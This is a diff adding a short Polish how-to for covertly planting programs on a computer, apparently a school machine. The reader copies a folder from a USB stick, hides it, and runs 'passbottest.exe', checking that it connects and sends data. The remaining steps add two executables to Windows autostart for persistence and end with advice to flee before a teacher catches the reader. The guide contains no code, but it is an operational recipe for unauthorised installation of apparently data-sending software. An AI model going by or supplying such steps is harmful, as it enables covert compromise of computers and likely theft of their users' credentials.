@@ -1,0 +1,10 @@
+Jak zainstalować program na komputerze.
+
+1. Wrzuć z pendrive'a na komputer cały folder (najlepiej wsadzić gdzieś głęboko i zmienić dostępność na ukryty)
+2. W ustawieniach wejdź w Prywatność i zabezpieczenia > Dla deweloperów
+3. Zmień terminal na Host Konsoli Systemu Windows
+4. Uruchom aplikację "passbottest.exe". Jeśli się połączy i wyśle przejdź do następnego kroku
+5. Włącz "CProject.exe"
+6. Sprawdź czy na pewno jest zmieniona na host konsoli (po odpaleniu programu poraz pierwszy może się to automatycznie zmienić)
+7. Dodaj aplikację "PProject.exe" i "CProject.exe" do autostartu (win+r wpisujesz shell:startup i wklejasz tam SKRÓTY programów)
+8. Wyjmij pendrive i uciekaj zanim cię dorwie jakiś nauczyciel
